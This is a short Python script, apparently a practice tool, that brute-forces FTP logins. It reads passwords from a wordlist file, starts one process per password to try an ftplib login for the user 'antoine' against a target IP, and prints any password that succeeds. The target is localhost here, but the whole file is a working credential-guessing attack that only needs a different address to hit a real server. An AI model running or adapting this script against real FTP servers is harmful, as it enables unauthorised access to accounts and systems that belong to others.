import ftplib, time, multiprocessing


def trying(ip,username,password):
    try:
        # print(f"[-] trying {password}")
        ftp = ftplib.FTP(ip,timeout=0.05)
        ftp.login(username, password)
        ftp.quit()
        print(f"[+] Password found: {password}")
        return True
    except:
        return False

def ftp_crack(ip,username,passwords):
    processes = []
    for password in passwords:
        proc = multiprocessing.Process(target=trying, args=(ip,username,password))
        processes.append(proc)
        proc.start()
    
    for process in processes:
        process.join()

if __name__ == "__main__":
    uname = "antoine"
    ip = "127.0.0.1"
    passwords = [i.strip() for i in open("passwd.txt")]
    ftp_crack(ip,uname,passwords)